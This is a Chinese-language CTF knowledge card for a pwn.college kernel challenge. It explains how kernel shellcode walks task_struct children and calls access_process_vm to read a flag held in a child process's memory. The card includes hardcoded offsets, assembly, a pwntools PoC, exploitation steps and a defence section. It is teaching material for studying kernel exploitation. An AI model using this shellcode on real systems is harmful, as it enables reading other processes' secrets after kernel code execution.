---
id: binary-pwn-kernel-access-process-vm-task-children-read
title: access_process_vm 读取子进程内存：task_struct children 遍历取 flag
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-access-process-vm-task-children-read
aliases:
- access_process_vm
- task_struct children
- sibling 偏移
- 读取子进程内存
- pwn.college level 11
tags:
- kernel
- pwn
- access-process-vm
- task-struct
- children
- flag
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T09:50:46+08:00'
  notes: 已对照原文核对代码/地址/偏移与利用链，一致；原文为 pwn.college 教学环境，卡内已标注地址偏移依赖具体内核版本/配置，未复跑 PoC。
---

## 一句话结论

当 flag 只存在于用户程序的子进程内存（父进程 fork 后子进程读 `/flag` 并常驻）时，可在内核 shellcode 中从 `current->children` 链表取子进程 `task_struct`（`sibling` 偏移 `0x4c0`，`children` 偏移 `0x4b0`），再用 `access_process_vm(child, addr, buf, len, 0)` 读取子进程虚拟地址上的 flag，最后 `printk` 输出。

## 原理

- **flag 在子进程**：`load_flag()` 先 `mmap` 匿名共享内存 + `sem_init`，然后 `fork()`；子进程 `open("/flag")`、`read` 到全局 `flag_23583`、`sem_post`，再 `while(1) sleep(1)` 常驻；父进程 `sem_wait` 后继续。父进程全局变量没有 flag，只有子进程有。
- **task_struct 父子链**：父进程 `task_struct` 的 `children`（偏移 `0x4b0`）是 `list_head` 头；子进程的 `sibling`（偏移 `0x4c0`）挂在父进程 `children` 链表上。`children.next` 指向子进程的 `sibling` 节点，减去 `0x4c0` 即得子进程 `task_struct`。
- **access_process_vm**：内核函数 `int access_process_vm(struct task_struct *tsk, unsigned long addr, void *buf, int len, unsigned int gup_flags)` 可读取其他进程虚拟内存，自动处理页表切换/缺页；`gup_flags=0` 表示读。符号地址可从 `/proc/kallsyms` 取得（本题无 KASLR）。
- **本题 shellcode**：
  ```asm
  mov rax, qword ptr gs:0x15d00   ; current
  add rax, 0x4b0                  ; current->children
  mov rax, [rax]                  ; children.next = child->sibling
  sub rax, 0x4c0                  ; child task_struct
  mov rdi, rax
  mov rsi, 0x404040               ; 子进程 flag 全局地址
  mov rdx, rsp
  mov rcx, 0x100
  xor r8, r8
  mov rax, access_process_vm
  call rax
  mov rdi, rsp
  mov rax, printk
  call rax
  ```
- **为什么可行**：内核代码可遍历任意 `task_struct` 并读取其用户内存；`access_process_vm` 是合法内核 API，不需要 ptrace 权限；题目无 KASLR，用户程序无 ASLR，flag 全局地址固定 `0x404040`。
- **边界**：需要内核代码执行；`current`/`children`/`sibling` 偏移随内核版本/配置变化；目标进程必须仍在运行；`access_process_vm` 可能受 `mmap_lock`/权限影响。

## 触发条件

- 用户程序 fork 子进程读 flag，子进程保持运行，父进程继续执行并触发内核代码。
- 攻击者获得内核代码执行（如模块 RWX + write shellcode）。
- 知道内核版本对应的 `current` 获取方式、`task_struct` 的 `children`/`sibling` 偏移、`access_process_vm`/`printk` 地址。
- 无 KASLR 或可泄露内核/用户地址；目标子进程未退出。

## 利用步骤

1. 分析用户程序，确认 flag 在子进程全局变量、父进程无 flag，子进程常驻；记录 flag 虚拟地址（本题 `0x404040`）。
2. 用 vmlinux/BTF/gdb 确认 `task_struct.children`（`0x4b0`）和 `sibling`（`0x4c0`）偏移；`current` 偏移从反汇编/内核配置获取。
3. 获取 `access_process_vm`、`printk` 地址（`/proc/kallsyms` 或已知偏移）。
4. 编写内核 shellcode：取 `current->children.next`，减 `sibling` 偏移得到子进程 `task_struct`；调用 `access_process_vm` 读 flag 到栈；再 `printk("%s", buf)`。
5. 通过用户 shellcode 把内核 shellcode 写到设备 fd（seccomp 只允许 write 时正好可用）。
6. 从 dmesg/输出读取 flag；若子进程已退出，改用 egg hunter/物理内存扫描。

## PoC

```python
from pwn import *
context.arch = "amd64"
shellcode = """
    sub rsp, 0x100
    mov rax, qword ptr gs:0x15d00
    add rax, 0x4b0
    mov rax, [rax]
    sub rax, 0x4c0
    mov rdi, rax
    mov rsi, 0x404040
    mov rdx, rsp
    mov rcx, 0x100
    xor r8, r8
    mov rax, 0xffffffff81190040   /* access_process_vm */
    call rax
    mov rdi, rsp
    mov rax, 0xffffffff810b69a9   /* printk */
    call rax
    add rsp, 0x100
    ret
"""
print(asm(shellcode).hex())
```

说明：偏移/地址来自原文 pwn.college level 11 的 Linux 内核环境；不同内核需用 BTF/pahole 核对。PoC 未在本机复跑。

## 变体与关联

- **按 comm/pid 查找**：遍历 `task_struct` 链表/红黑树，按 `comm`、`pid`、`real_parent` 找目标；参见 [[binary-pwn-kernel-task-struct-comm-scan-init-cred-lpe]]。
- **其他读取方式**：`/proc/<pid>/mem`、`process_vm_readv`、`ptrace`；内核态 `access_process_vm` 最直接。
- **子进程已退出**：改用 [[binary-pwn-kernel-egg-hunter-physical-memory-scan]] 扫描物理内存残留。
- **关联**：[[binary-pwn-kernel-shellcode-clear-tif-seccomp]]（seccomp 只允许 write 时的用户 shellcode）。

## 检测与防御

- **减少暴露**：不要把 flag 长期留在子进程内存；读取后清零/退出，父进程不要保留；使用 `mlock`/`madvise` 限制换出。
- **内核加固**：KASLR、SMEP/SMAP、W^X、模块签名、限制 `access_process_vm` 的调用面；内核代码执行本身是最高危。
- **检测**：监控内核模块加载/可执行内存、异常 `access_process_vm` 调用、dmesg 中的异常 printk；对 `/proc/<device>` 写 shellcode 告警。
- **边界**：本卡是 CTF/教学场景；真实系统应防止内核代码执行，并避免敏感数据长期驻留进程内存。
